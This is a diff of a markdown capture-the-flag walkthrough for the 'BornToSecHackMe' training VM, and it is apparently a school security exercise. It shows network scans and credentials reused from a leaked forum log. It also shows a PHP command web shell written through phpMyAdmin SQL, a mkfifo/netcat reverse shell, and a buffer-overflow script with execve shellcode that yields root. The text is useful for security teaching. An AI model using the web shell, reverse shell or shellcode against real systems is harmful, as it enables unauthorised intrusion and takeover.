@@ -1,178 +1,148 @@
 # Writeup1
+**First way to become root**
 
-first way to become root
+- [Writeup1](#writeup1)
+	- [1. Virtual Machine Adress](#1-virtual-machine-adress)
+		- [1.1 Scan IP](#11-scan-ip)
+		- [1.2 Network Scan](#12-network-scan)
+		- [1.3 Website](#13-website)
+	- [2. Exploitation](#2-exploitation)
+		- [2.1 Credential Leak (Forum) - https://ip/forum](#21-credential-leak-forum---httpsipforum)
+		- [2.2 Webmail Access - https://ip/webmail](#22-webmail-access---httpsipwebmail)
+		- [2.3 phpMyAdmin Access - https://ip/phpmyadmin](#23-phpmyadmin-access---httpsipphpmyadmin)
+	- [3. Reverse Shell](#3-reverse-shell)
+		- [3.1 Listener Setup (Attacker Machine)](#31-listener-setup-attacker-machine)
+		- [3.2 Connection from Target](#32-connection-from-target)
+		- [3.3 Shell connection](#33-shell-connection)
+	- [3.4. File's exploitation](#34-files-exploitation)
+	- [4. SSH connection](#4-ssh-connection)
+	- [4.2 Laurie's session](#42-lauries-session)
+		- [Phase\_1](#phase_1)
+			- [result](#result)
+		- [Phase\_2](#phase_2)
+			- [result](#result-1)
+		- [Phase\_3\`](#phase_3)
+			- [result](#result-2)
+		- [Phase\_4](#phase_4)
+			- [result](#result-3)
+		- [Phase\_5](#phase_5)
+			- [result](#result-4)
+		- [Phase\_6](#phase_6)
+			- [result](#result-5)
+		- [Final Result](#final-result)
+	- [4.3 Thor's session](#43-thors-session)
+	- [4.4 Zaz's session](#44-zazs-session)
+			- [Tuto Overflow With Shellcode : 'https://www.samsclass.info/127/proj/p3-lbuf1.htm'](#tuto-overflow-with-shellcode--httpswwwsamsclassinfo127projp3-lbuf1htm)
+		- [Finding the Offset](#finding-the-offset)
+		- [Analysis](#analysis)
+		- [Exploitation](#exploitation)
+		- [Getting a Root Shell](#getting-a-root-shell)
+		- [Verification](#verification)
+	- [Users informations](#users-informations)
+	- [REF](#ref)
 
-## netcat
+## 1. Virtual Machine Adress
+
+### 1.1 Scan IP
 
 ```bash
-nmap -sn 192.168.1.0/24 -oA scan.txt
-nmap -p- 192.168.1.146
->> Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-16 16:21 CEST
->> Nmap scan report for BornToSecHackMe.lan (192.168.1.146)
->> Host is up (0.047s latency).
->> Not shown: 65529 closed tcp ports (conn-refused)
->> PORT    STATE SERVICE
->> 21/tcp  open  ftp
->> 22/tcp  open  ssh
->> 80/tcp  open  http
->> 143/tcp open  imap
->> 443/tcp open  https
->> 993/tcp open  imaps
+ip addr
+# → inet 192.168.1.146/24
 ```
----
 
-| Port	  | Service	| mean |
-| ----- | ----- | ----- | 
-| 21/tcp | 	FTP | File transfert Protocol |
-| 22/tcp | 	SSH | shell connection  |
-| 80/tcp | 	HTTP | website  http://192.168.1.X |
-| 143/tcp | IMAP |  email Server |
-| 443/tcp | HTTPS | website SSL |
-| 993/tcp | IMAPS | Encrypted IMAP |
----
+### 1.2 Network Scan
 
-## wesite
+```bash
+# Active machine detection on local network
+nmap -sn 192.168.1.0/24 -oA scan.txt
+
+# Full port scan on identified target
+nmap -p- 192.168.1.146
+```
+
+| Port  | Service | Description                       |
+|-------|---------|-----------------------------------|
+| 21    | FTP     | File Transfer Protocol            |
+| 22    | SSH     | Secure Shell                      |
+| 80    | HTTP    | Web Server                        |
+| 143   | IMAP    | Mail Access                       |
+| 443   | HTTPS   | Secure Web                        |
+| 993   | IMAPS   | Secure IMAP                       |
+
+
+### 1.3 Website
 
 ![alt](./img/website.png)
 
-```html
-<!DOCTYPE html>
-<html>
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-	<title>Hack me if you can</title>
-	<meta name='description' content='Simple and clean HTML coming soon / under construction page'/>
-	<meta name='keywords' content='coming soon, html, html5, css3, css, under construction'/>	
-	<link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
-	<link href='http://fonts.googleapis.com/css?family=Coustard' rel='stylesheet' type='text/css'>
-
-</head>
-<body>
-	<div id="wrapper">
-		<h1>Hack me</h1>
-		<h2>We're Coming Soon</h2>
-		<p>We're wetting our shirts to launch the website.<br />
-		In the mean time, you can connect with us trought</p>
-		<p><a href="https://fr-fr.facebook.com/42Born2Code"><img src="fb.png" alt="Facebook" /></a> <a href="https://plus.google.com/+42Frborn2code"><img src="+.png" alt="Google +" /></a> <a href="https://twitter.com/42born2code"><img src="twitter.png" alt="Twitter" /></a></p>
-	</div>
-</body>
-</html>
+Directory bruteforce with gobuster:
+```bash
+gobuster dir -u https://192.168.1.146/ -w common.txt -k -x php,bak,txt,sql
 ```
 
----- 
-
-### gobuster
-
+Interesting paths:
 ```bash
-gobuster dir -u https://192.168.1.64/ -w common.txt -k -x php,bak,txt,sql      
-
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     https://192.168.1.64/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              php,bak,txt,sql
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/index.html           (Status: 200) [Size: 1025]
-/.html                (Status: 403) [Size: 286]
-/forum                (Status: 403) [Size: 286]
-/fonts                (Status: 301) [Size: 314] [--> http://192.168.1.X/fonts/]
-/.html                (Status: 403) [Size: 286]
-/forum/index.php?mode=lmezard.sql (Status: 200) [Size: 5317]
-/forum/index.php?mode=lmezard.php (Status: 200) [Size: 5317]
-/forum/index.php?mode=login.bak (Status: 200) [Size: 5317]
-/forum/index.php?mode=lmezard.bak (Status: 200) [Size: 5317]
-/forum/index.php?mode=lmezard (Status: 200) [Size: 5317]
-/forum/index.php?mode=login.php (Status: 200) [Size: 5317]
-/forum/index.php?mode=login.sql (Status: 200) [Size: 5317]
-/forum/index.php?mode=login (Status: 200) [Size: 3270]
-/forum/index.php?mode=login.txt (Status: 200) [Size: 5317]
-/forum/index.php?mode=lmezard.txt (Status: 200) [Size: 5317]
-/forum/index.php?mode=qudevide (Status: 200) [Size: 5317]
-/forum/index.php?mode=qudevide.bak (Status: 200) [Size: 5317]
-/forum/index.php?mode=qudevide.txt (Status: 200) [Size: 5317]
-/forum/index.php?mode=qudevide.php (Status: 200) [Size: 5317]
-/forum/index.php?mode=qudevide.sql (Status: 200) [Size: 5317]
-/forum/index.php?mode=thor.txt (Status: 200) [Size: 5317]
-/forum/index.php?mode=thor (Status: 200) [Size: 5317]
-/forum/index.php?mode=thor.php (Status: 200) [Size: 5317]
-/forum/index.php?mode=thor.bak (Status: 200) [Size: 5317]
-/forum/index.php?mode=thor.sql (Status: 200) [Size: 5317]
-/forum/index.php?mode=wandre (Status: 200) [Size: 5317]
-/forum/index.php?mode=wandre.sql (Status: 200) [Size: 5317]
-/forum/index.php?mode=wandre.php (Status: 200) [Size: 5317]
-/forum/index.php?mode=wandre.bak (Status: 200) [Size: 5317]
-/forum/index.php?mode=wandre.txt (Status: 200) [Size: 5317]
-/forum/index.php?mode=zaz (Status: 200) [Size: 5317]
-/forum/index.php?mode=zaz.txt (Status: 200) [Size: 5317]
-/forum/index.php?mode=zaz.php (Status: 200) [Size: 5317]
-/forum/index.php?mode=zaz.sql (Status: 200) [Size: 5317]
-/forum/index.php?mode=zaz.bak (Status: 200) [Size: 5317]
-/forum/index.php      (Status: 200) [Size: 5288]
-/cgi-bin/             (Status: 403) [Size: 289]
 /forum                (Status: 301) [Size: 314] [--> https://192.168.1.64/forum/]
 /phpmyadmin           (Status: 301) [Size: 319] [--> https://192.168.1.64/phpmyadmin/]
-/server-status        (Status: 403) [Size: 294]
 /webmail              (Status: 301) [Size: 316] [--> https://192.168.1.64/webmail/]
-Progress: 23100 / 23105 (99.98%)
-===============================================================
-Finished
-===============================================================
+```
+---
+
+## 2. Exploitation
+
+### 2.1 Credential Leak (Forum) - https://ip/forum
+
+```bash
+# Warning → to connect at forum don't use http:// is forbidden use https://
 ```
 
-## https://ip/forum
+A forum post titled **"Problem login ?"** contains debug logs:
 
-> ![Warning]
-> to connect at forum don't use http:// is forbidden use https://
+```text
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+```
 
-![alt](img/forum.png)
+![alt](./img/login.png)
 
-When we check the topics, our eyes are attract by "Problem login ?" 
-
-### Problem login ?
-
-that look likes a copy of a pcap file. we can someone (lmezard) trying to become admin and root. The user wanted to show a failled but the user make a mistake and leak his password.
-``Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2``
+Credentials recovered:
+- **User:** `lmezard`
+- **Password:** `!q\]Ej?*5K5cy*AJ`
 
 So we use this information to log in. **lmezard** and `!q\]Ej?*5K5cy*AJ`
-![alt](./img/login.png)
 That works, we can find the [email](#users-informations).
 
-Now go to:
-
-
-## https://ip/webmail
+### 2.2 Webmail Access - https://ip/webmail
 
 ![alt](img/webmail_log.png)
 
-let's try to connect with the email laurie@borntosec.net and the same password **!q\]Ej?*5K5cy*AJ** , lot of person doesn't change their password between the differents applications. 
+Login credentials:
+- **Email:** `laurie@borntosec.net`
+- **Password:** `!q\]Ej?*5K5cy*AJ`
 
-We can see an email with the subject ***DB Access***
+> **Insight:** Users often reuse passwords across multiple services.
+
+Mail contains DB credentials:
 
 ![alt](img/mail.png)
 
-let's connect at the database with this informationm user = **root** pwd = ``Fg-'kKXBj87E:aJ$``.
+```text
+User: root
+Password: Fg-'kKXBj87E:aJ$
+```
 
-## https://ip/phpmyadmin
+### 2.3 phpMyAdmin Access - https://ip/phpmyadmin
 
+1. Navigate to `https://192.168.1.146/phpmyadmin/`
 
-We can update our [users informations](#users-informations) with this  localhost->forum_db->mlf2_userdata
+2. Log in with recovered credentials
+User data was modified via `forum_db.mlf2_userdata` in phpMyAdmin.
 
-there is *user_pw*, we try to decrypt the password of lmezard because we now the **clear pwd** but we didn't found. On ``https://192.168.1.146/forum/index.php?mode=user&action=edit_profile`` we can modifie the password, that change in the DB but not for the webmail service.
+Password hashes could not be reversed despite having a known plaintext (lmezard).
 
-So we know the clear pwd of laurie so we can copy from the DB and paste in the pwd of **admin**
+Password changes through the web interface only affect the database, not other services.
 
-Now we can connect in the forum with **admin** and the same password than **lmezzard** 
+Using Laurie’s known password, its hash was copied and assigned to the **admin** account.
 
-Now we can access at the __Admin page__
+This allowed authentication as **admin** on the forum and access to the administrative panel.
 
 ![alt](img/Admin_forum.png)
 
@@ -180,61 +150,48 @@ Now we can access at the __Admin page__
 
 ![alt](img/template_c.png)
 
-in this page there is some php files. We will note this **url**
+In this page there is some php files. We will note this **url**
 
-----
 
-On phpmyadmin we can load file 
+3. Write a webshell via SQL query
 
-to know where we can write the script :
-to see all the Varriables
-```SQL
-SHOW VARIABLES
-```
-or directly : 
-```SQL
-SHOW VARIABLES LIKE 'datadir/'
-```
-*response:*
-
-| Variable_name	| Value |
-|---|---|
-| datadir	| /var/lib/mysql/ |
-```SQL
-SHOW VARIABLES LIKE 'version%'
-```
-*response:*
-| Variable_name |	Value |
-| ----|----|
-| version |	5.5.44-0ubuntu0.12.04.1 |
-| version_comment |	(Ubuntu) |
-| version_compile_machine |	i686 |
-| version_compile_os |	debian-linux-gnu |
-
-Load malecious script:
-```SQL
+```sql
 SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET[''cmd'']) { system($_GET[''cmd'']);} ?> </pre></BODY></HTML>'
  INTO OUTFILE "/var/www/forum/templates_c/cmd.php"
 ```
-https://192.168.1.146/forum/templates_c/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.146%2012345%20%3E%2Ftmp%2Ff
+---
 
-Now, we can connect at https://192.168.1.146/forum/templates_c/cmd.php?cmd=id :
+## 3. Reverse Shell
+
+### 3.1 Listener Setup (Attacker Machine)
+
+On our terminal:
+```bash
+nc -lvnp 1234
+```
+
+### 3.2 Connection from Target
+
 ![alt](img/etc_passwd.png)
 
------------
-
-on our terminal 
-```sh
-nc -lnvp 1234
+On the internet https://<ip>/forum/templates_c/cmd.php :
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc VIrtualMachine_IP 1234 >/tmp/f
 ```
 
-on the internet https://192.168.1.146/forum/templates_c/cmd.php :
-```sh
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+### 3.3 Shell connection
+
+On our terminal appears: 
+```bash
+Listenning on 0.0.0.0 1234
+Connecting reveived on 192.168.1.64 54543
+/bin/sh: 0 can't access tty; job control turned off
+$ whoami
+>>> www-data
+$ find / -user www-data 2>/dev/null
 ```
 
-on our terminal 
-![alt](img/nc_reverseshell.png)
+Impossible use su command:
 ```sh
 cat /home/LOOKATME/password
 >> lmezard:G!@M6f4Eatau{sF"
@@ -243,14 +200,9 @@ su lmezard
 ```
 with a research on [internet](https://unix.stackexchange.com/questions/594264/error-su-must-be-run-from-a-terminal?__cf_chl_tk=.M.TvcaACsdi9g3YQYNf2kmx6stuQibrlhF7rA6zHQ0-1782222640-1.0.1.1-DY6ddXZzuy2MR7gNUHQnMudBNiy6mAtwy_Sat_SO_EE) we found : ``python -c 'import pty; pty.spawn("/bin/sh")'``
 
-and 
 
-```shell
-nc -lnvp 1234
->>Listening on 0.0.0.0 1234
->>Connection received on 192.168.1.64 54653
->>/bin/sh: 0: can t access tty; job control turned off
-python -c 'import pty; pty.spawn("/bin/sh")'
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
 su lmezard
 Password: 'G!@M6f4Eatau{sF"'
 lmezard@BornToSecHackMe:/var/www/forum/templates_c$
@@ -261,8 +213,21 @@ lmezard@BornToSecHackMe:~$ cat README
 >>Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 ```
 
+We can copy file fun.tar on templates_c repository :
+
+```bash
+lmezard@BornToSecHackMe:~$ chmod 777 fun
+lmezard@BornToSecHackMe:~$ cp fun /var/www/forum/templates_c/
+```
+
+---
+
+##  3.4. File's exploitation
+1. Navigate to `https://192.168.1.146/forum/templates_c/` and upload fun file 
+2. Extract files fun file
+
 There is a lot of files, in shuffle order.
-we cat them 
+We cat them: 
 ```sh
 cat * | grep return
 //file483    return 'a';
@@ -278,7 +243,7 @@ cat * | grep return
 //file640    return 'r';
 //file3    return 'h';
 ```
-we notice it's c program at **file1** ``#include <stdio.h>`` and the main fonction 
+We notice it's c program at **file1** ``#include <stdio.h>`` and the main fonction : 
 ```c
 int main() {
 	printf("M");
@@ -313,7 +278,7 @@ int main() {
 	printf("Now SHA-256 it and submit");
 }
 ```
-if we seach ``getme1()`` there is `{` but not the `}` we can read //file5 so go to //file6 and we find 	``return 'I';``
+If we seach ``getme1()`` there is `{` but not the `}` we can read //file5 so go to //file6 and we find 	``return 'I';``
 
 we did that for every getme until getme8(), that gave us :
 
@@ -321,14 +286,19 @@ we did that for every getme until getme8(), that gave us :
 SHA-256
 	`330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 `
-------------------------------
 
-## Laurie's session 
+## 4. SSH connection
 
-![Laurie's session](./img/Laurie_ssh.png)
+## 4.2 Laurie's session 
 
-> [!NOTE] 
-> keep in mind this hint. 
+Now we can try to connect via SSH using **laurie** and the generated password:
+
+```bash
+ssh laurie@192.168.1.146
+Password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+laurie@BornToSecHackMe:~$ ls
+README  bomb
+```
 
 The “Bomb” program consists of 6 phases that must be defused by solving the puzzles. To do this, we will use Ghidra to reverse it.
 
@@ -388,7 +358,7 @@ cf [phase6.c](./scripts/bomb/phase5.c)
 
 4 2 6 3 1 5
 
-## Final Result
+### Final Result
 
 We remember the README, we remove the space and we found 3 solutions:
 ``Publicspeakingisveryeasy.126241207201b2149opekma426315``
@@ -402,34 +372,49 @@ The result is ``Publicspeakingisveryeasy.126241207201b2149opekmq426135``
 
 Now we can connect with **thor**
 
-## Thor's session
+
+---
+## 4.3 Thor's session 
 
 In the *home* of **thor** there is a README and turtle file. 
 We understood it's a logo language, and turtle is use to draw.
 We found http://www.logointerpreter.com/turtle-editor.php , we replace the instruction like **Avance** by **fd**, etc...
 
-[turtle](./scripts/thor/turtle)
+[Script turtle](./scripts/thor/turtle)
 
-[solution](./img/SLASH.png)
+![solution](./img/SLASH.png)
 
 We md5 SLASH to use for **zaz**'s session.
 
 result :  ``646da671ca01bb5d84dbb5fb2238dc8e``
 
-------------------------------
+---
+## 4.4 Zaz's session 
 
-## Privilege Escalation via Buffer Overflow (zaz)
-
+Privilege Escalation via Buffer Overflow (zaz)
 #### Tuto Overflow With Shellcode : <a/>'https://www.samsclass.info/127/proj/p3-lbuf1.htm'
 
+---
+
 ### Finding the Offset
+
+---
+
+Connect with ssh zaz@<ip_vm>:
+
+```bash
+zaz@BornToSecHackMe:~$ readelf -l ./exploit_me | grep GNU_STACK
+>>>GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+```
+
+So we can exploit the stack (RWE).
 
 We craft a payload to identify where the overflow reaches the instruction pointer (EIP).
 
 ```bash
 vim p.py
 
-#!/usr/bin/python 
+#!/usr/bin/python2
 
 nopsled = '\x90' * 64 
 shellcode = (
@@ -437,10 +422,12 @@ shellcode = (
 '\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
 '\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
 )
-padding = 'A' * (140 - 64 - 32) ---> 140 buffer size
+padding = 'A' * (140 - 64 - 32)
 eip = '1234'
 print nopsled + shellcode + padding + eip
+```
 
+```bash
 pyton2 p.py > test
 chmod 777 test
 ```
@@ -449,6 +436,7 @@ chmod 777 test
 
 ### Analysis
 
+---
 We analyze the binary using `gdb` to understand how user input is handled.
 
 ```bash
@@ -518,10 +506,11 @@ Inspect the stack:
 0xbffff5a0:	0x41414141	0x41414141	0x41414141	0x41414141		<------------- The 'A' or '41'
 0xbffff5b0:	0x41414141	0x41414141	0x41414141	0x34333231		<------------- The last 4 bytes correspond to the return pointer (EIP). '1234' or '34333231'  
 ```
-------------------------------------
+---
 
 ### Exploitation
 
+---
 We now replace EIP with an address pointing to our NOP sled.
 
 From the stack:
@@ -538,7 +527,7 @@ Final exploit:
 ```bash
 vim p.py
 
-#!/usr/bin/python 
+#!/usr/bin/python2
 
 nopsled = '\x90' * 64 
 shellcode = (
@@ -546,8 +535,8 @@ shellcode = (
 '\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
 '\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
 )
-padding = 'A' * (140 - 64 - 32) ---> 140 buffer size
-eip = \'\x50\xf5\xff\xbf\' 										<------------- 0xbffff550 since the Intel x86 processor in "little-endian", the least significant 
+padding = 'A' * (140 - 64 - 32)
+eip = '\x50\xf5\xff\xbf\' 										<------------- 0xbffff550 since the Intel x86 processor in "little-endian", the least significant 
 print nopsled + shellcode + padding + eip									   the address byte comes first, so we need to reverse the order of the bytes
 ```
 
@@ -565,34 +554,23 @@ Starting program: /home/zaz/exploit_me $(cat test)
 /bin/bash: warning: setlocale: LC_ALL: cannot change locale (fr_FR.UTF-8)
 
 Breakpoint 1, 0x08048425 in main ()
-(gdb) x/x40 $esp
-A syntax error in expression, near $esp.
 (gdb) x/40x $esp
-0xbffff520:	0xbffff530	0xbffff7b3	0x00000001	0xb7ec3c2d
-0xbffff530:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff540:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff550:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff560:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff570:	0xc389c031	0x80cd17b0	0x6852d231	0x68732f6e
-0xbffff580:	0x622f2f68	0x52e38969	0x8de18953	0x80cd0b42
-0xbffff590:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff5a0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff5b0:	0x41414141	0x41414141	0x41414141	0xbffff550		<------------- Our previously modified EIP
+	[\90...]
+	0xbffff5b0:	0x41414141	0x41414141	0x41414141	0xbffff550		<------------- Our previously modified EIP
 (gdb) c
 Continuing.
 ����������������������������������������������������������������1��ð̀1�Rhn/shh//bi��RS��B
-                                                                                        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP���
-process 2233 is executing new program: /bin/dash
+process 2233 is executing new program: /bin/dash					<------------- /bin/bash execute but error
 //bin/sh: relocation error: //bin/sh: symbol &�����-��u�@
                                                          , version GLIBC_2.0 not defined in file libc.so.6 with link time reference
 [Inferior 1 (process 2233) exited with code 0177]
 ```
-
 ---
 
 ### Getting a Root Shell
 
-Execute the binary with gdb:
+---
+Execute the binary without gdb:
 
 ```bash
 ./exploit_me $(cat test)
@@ -609,6 +587,7 @@ We now have a root shell.
 ---
 
 ### Verification
+---
 
 ```bash
 cd /root
@@ -628,13 +607,13 @@ To be continued...
 
 |   Username |	Type | UID |	Homepage	| E-mail | passwd | ssh passwd | 
 |----| ---- | --- | --- |----- | ---- | ---- |
-|   root |	root |	 0  | |	root@mail.borntosec.net|`Fg-'kKXBj87E:aJ$`|
+|   root |	root |	 0  | |	root@mail.borntosec.net|`Fg-'kKXBj87E:aJ$`| | 
 |   admin |	Admin |	 1000  | |	admin@borntosec.net | | |
-|   lmezard |	User | 1040| 	 |		laurie@borntosec.net  | `!q\]Ej?*5K5cy*AJ` </br> `G!@M6f4Eatau{sF"`| 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
-|   qudevide |	User | | 	 |	qudevide@borntosec.net  | |
-|   thor |	User |	 | | 	thor@borntosec.net  | |
-|   wandre |	User | | 	 | wandre@borntosec.net | |
-|   zaz |	User |	 | | zaz@borntosec.net | |
+|   lmezard |	User | 1040| 	 |		laurie@borntosec.net  | `!q\]Ej?*5K5cy*AJ` </br> `G!@M6f4Eatau{sF"`| 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4 |
+|   qudevide |	User | | 	 |	qudevide@borntosec.net  | | |
+|   thor |	User |	 | | 	thor@borntosec.net  | | Publicspeakingisveryeasy.126241207201b2149opekmq426135 |
+|   wandre |	User | | 	 | wandre@borntosec.net | | |
+|   zaz |	User |	 | | zaz@borntosec.net | | 646da671ca01bb5d84dbb5fb2238dc8e |
 
 
 ----------------
@@ -658,7 +637,8 @@ To be continued...
 
 - su problem:
 	- https://unix.stackexchange.com/questions/594264/error-su-must-be-run-from-a-terminal
-
-- Turtle (logo)
-	- https://fr.wikipedia.org/wiki/Logo_(langage)
-	- http://www.logointerpreter.com/turtle-editor.php
+  
+- Overflow tuto:
+	- https://www.samsclass.info/127/proj/p3-lbuf1.htm
+	- https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
+	- https://www.youtube.com/watch?v=Uk-xv8uxiJo&t=134s
